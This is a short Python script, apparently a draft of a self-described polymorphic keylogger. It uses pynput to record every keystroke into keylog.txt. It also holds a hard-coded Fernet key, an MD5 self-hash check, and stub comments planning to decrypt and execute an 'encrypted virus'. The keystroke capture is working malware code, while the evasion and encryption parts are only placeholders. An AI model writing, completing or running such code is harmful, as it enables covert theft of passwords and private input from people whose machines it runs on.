#!/usr/bin/env python3

from pynput.keyboard import Key, Listener
from cryptography.fernet import Fernet
import hashlib

def check_hash(): # Test to see if file hash has changed
    hash = hashlib.md5(open("pmorphic_keylogger.py", "rb").read()).hexdigest()
    print(hash)

def decrypt():
    print("placeholder")
    # WORKFLOW:
    # Decrypt encrypted virus
    # Exec decrypted virus

key = "PLQAMThhNwtYPhLNGw9Xmcghjd6UCi5FgK7lX7i5iI8="
check_hash()

# ENCRYPT ME
def on_press(key):
    # record keystrokes
    f = open("keylog.txt", "a")
    f.write(str(key))


with Listener(
        on_press=on_press
) as listener:
    listener.join()

f.close()
